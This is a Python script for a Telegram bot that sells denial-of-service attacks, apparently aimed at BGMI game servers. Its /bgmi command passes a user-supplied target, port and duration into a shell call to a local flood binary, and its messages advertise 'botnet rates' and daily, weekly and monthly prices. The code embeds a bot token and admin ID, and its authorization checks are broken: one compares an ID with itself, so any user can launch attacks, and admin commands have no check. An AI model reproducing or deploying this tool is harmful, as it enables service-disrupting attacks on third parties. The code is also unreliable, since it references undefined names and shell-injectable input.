#!/usr/bin/python3
#By Indian Watchdogs @Indian_Hackers_Team

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7057221824:AAEHiqVq3qC3U3yWByLufnvT-xMzgCdJyiE')

# Admin user IDs
admin_id = ["6800732852"]
# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    command = message.text.split()
    if len(command) > 1:
        user_to_add = command[1]
        if user_to_add not in allowed_user_ids:
            allowed_user_ids.append(user_to_add)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_add}\n")
            response = f"User {user_to_add} added successfully."
        else:
            response = "User already exists."
    else:
        response = "Please specify a user ID to add."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    command = message.text.split()
    if len(command) > 1:
        user_to_remove = command[1]
        if user_to_remove in allowed_user_ids:
            allowed_user_ids.remove(user_to_remove)
            with open(USER_FILE, "w") as file:
                for user_id in allowed_user_ids:
                    file.write(f"{user_id}\n")
            response = f"User {user_to_remove} removed successfully."
        else:
            response = f"User {user_to_remove} not found in the list."
    else:
        response = "Please specify a user ID to remove. Usage: /remove <userid>"
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    try:
        with open(LOG_FILE, "r+") as file:
            log_content = file.read()
            if log_content.strip() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "Logs are already cleared."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    try:
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
            if user_ids:
                response = "Authorized Users:\n"
                for user_id in user_ids:
                    try:
                        user_info = bot.get_chat(int(user_id))
                        username = user_info.username
                        response += f"- @{username} (ID: {user_id})\n"
                    except Exception as e:
                        response += f"- User ID: {user_id}\n"
            else:
                response = "No data found"
    except FileNotFoundError:
        response = "No data found"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except FileNotFoundError:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "No data found"
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy Indian Watchdogs @Indian_Hackers_Team"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in user_id:
        # Check if the user has run the command before and is still within the cooldown period
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 1:
            response = "You are on cooldown. Please wait 5 minutes before running the /bgmi command again."
            bot.reply_to(message, response)
            return
        # Update the last time the user ran the command
        bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 5000:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 1000"
                subprocess.run(full_command, shell=True)
                response = f"BGMI attack finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "Usage: /bgmi <target> <port> <time>\nBy Indian Watchdogs @Indian_Hackers_Team"
    else:
        response = "You are not authorized to use this command.\nBy Indian Watchdogs @Indian_Hackers_Team"
    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /bgmi : Method for BGMI servers. 
 /rules : Please check before use.
 /mylogs : To check your recent attacks.
 /plan : Checkout our botnet rates.

 To see admin commands:
 /admincmd : Shows all admin commands.
 By Indian Watchdogs @Indian_Hackers_Team
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Your Home, {user_name}! Feel free to explore.\nTry to run this command: /help\nWelcome to the world's best DDoS bot\nBy Indian Watchdogs @Indian_Hackers_Team"
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, please follow these rules:

1. Don't run too many attacks! Causes a ban from bot.
2. Don't run 2 attacks at the same time because if you do, you get banned from the bot. 
3. We check the logs daily, so follow these rules to avoid a ban!!
By Indian Watchdogs @Indian_Hackers_Team'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, brother, only 1 plan is more powerful than any other DDoS!:

VIP:
-> Attack Time: 200 (s)
-> After Attack Limit: 2 min
-> Concurrent Attacks: 300

Price List:
Day --> 150 Rs
Week --> 900 Rs
Month --> 1600 Rs
By Indian Watchdogs @Indian_Hackers_Team
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, admin commands are here:

/add <userId>: Add a user.
/remove <userid>: Remove a user.
/allusers: Authorized users list.
/logs: All users logs.
/broadcast: Broadcast a message.
/clearlogs: Clear the logs file.
By Indian Watchdogs @Indian_Hackers_Team
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    command = message.text.split(maxsplit=1)
    if len(command) > 1:
        message_to_broadcast = "Message to all users by admin:\n\n" + command[1]
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
            for user_id in user_ids:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
        response = "Broadcast message sent successfully to all users."
    else:
        response = "Please provide a message to broadcast."
    bot.reply_to(message, response)

bot.polling()
# By Indian Watchdogs @Indian_Hackers_Team
